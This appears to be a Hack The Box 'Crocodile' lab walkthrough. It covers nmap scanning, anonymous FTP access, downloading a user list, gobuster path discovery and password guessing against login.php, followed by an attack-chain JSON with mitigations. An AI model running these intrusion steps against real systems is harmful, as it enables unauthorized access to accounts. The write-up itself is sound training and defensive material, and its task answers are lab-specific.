# HTB Crocodile - FTP + Web Enumeration Playbook

Target theme:
- Anonymous FTP access
- Clear-text credential discovery
- Web login pivot via discovered username list

Use in authorized lab scope only.

---

## 1. Objective

Build attack path from exposed services to web authentication:
1. discover FTP and HTTP,
2. validate anonymous FTP access,
3. extract usernames/credential hints,
4. discover login endpoint,
5. validate credential hypothesis.

---

## 2. Service Discovery

```bash
nmap -sC -sV <TARGET_IP>
```

Expected findings:
- port 21: `vsftpd 3.0.3`
- port 80: `Apache httpd 2.4.41`

Task answers:
- default-script switch: `-sC`
- FTP anonymous success code: `230`

---

## 3. Anonymous FTP Enumeration

Connect:

```bash
ftp <TARGET_IP>
```

When prompted:
- username: `anonymous`
- password: any value or blank

Useful FTP commands:

```text
ls
pwd
cd <dir>
get <file>
mget *
```

In this lab, downloading `allowed.userlist` reveals likely valid usernames such as `admin`.

Task answers:
- anonymous username: `anonymous`
- download command: `get`
- high-priv sounding user in list: `admin`

---

## 4. Web Enumeration Pivot

Use Gobuster to discover hidden web paths and PHP files:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html
```

Task answers:
- switch for file types: `-x`
- discovered auth endpoint: `login.php`

---

## 5. Authentication Hypothesis

After discovering `login.php`, combine FTP-derived usernames with likely passwords from challenge context.

Approach:
1. test username candidates from `allowed.userlist`
2. try known/default/common lab passwords
3. confirm successful auth and capture evidence

---

## 6. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV 10.129.147.100
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41

analyst@kali:~$ ftp 10.129.147.100
Connected to 10.129.147.100.
220 (vsFTPd 3.0.3)
Name: anonymous
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
allowed.userlist
ftp> get allowed.userlist

analyst@kali:~$ cat allowed.userlist
admin
...other users...

analyst@kali:~$ gobuster dir -u http://10.129.147.100/ -w /usr/share/wordlists/dirb/common.txt -x php,html
/login.php            (Status: 200)

Browser: http://10.129.147.100/login.php
Username candidate from FTP list validated; login successful.
```

---

## 7. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "crocodile_ftp_to_web_auth_pivot",
	"input_signals": [
		"FTP service allows anonymous login (230)",
		"allowed.userlist file exposed over FTP",
		"Web endpoint login.php discovered via directory brute force",
		"Credential hypothesis succeeded on web login"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Network Service Discovery",
			"confidence": 0.95,
			"evidence": "nmap identified ftp and apache services"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Anonymous/Guest Access",
			"confidence": 0.97,
			"evidence": "anonymous ftp access granted with code 230"
		},
		{
			"step": 3,
			"tactic": "credential_access",
			"technique": "Unsecured Credentials / Account Discovery",
			"confidence": 0.9,
			"evidence": "allowed.userlist exposed admin username candidate"
		},
		{
			"step": 4,
			"tactic": "initial_access",
			"technique": "Valid Accounts",
			"confidence": 0.86,
			"evidence": "derived username used successfully on login.php"
		}
	],
	"hypotheses": [
		"FTP-exposed username list may be reused across SSH/SMB/web auth",
		"Additional files on FTP may expose passwords or configuration secrets",
		"Weak password policy likely present on related application users"
	],
	"uncertainties": [
		"Scope of account reuse across services not fully validated",
		"Authorization boundaries behind login not fully mapped",
		"No evidence yet of account lockout/rate-limit controls"
	],
	"tool_calls": [
		{"name": "ftp_artifact_collector", "priority": "high"},
		{"name": "web_auth_surface_mapper", "priority": "high"},
		{"name": "credential_reuse_probe", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable anonymous FTP if not required",
			"Remove exposed userlists and sensitive files from FTP root",
			"Force password reset for affected account set"
		],
		"hardening": [
			"Enforce strong password policy and MFA where possible",
			"Segment FTP from public internet or replace with secure alternatives",
			"Apply least-privilege access to public file services"
		],
		"monitoring": [
			"Alert on repeated anonymous FTP sessions",
			"Monitor suspicious downloads of identity-related files",
			"Track unusual login attempts on discovered auth endpoints"
		]
	}
}
```
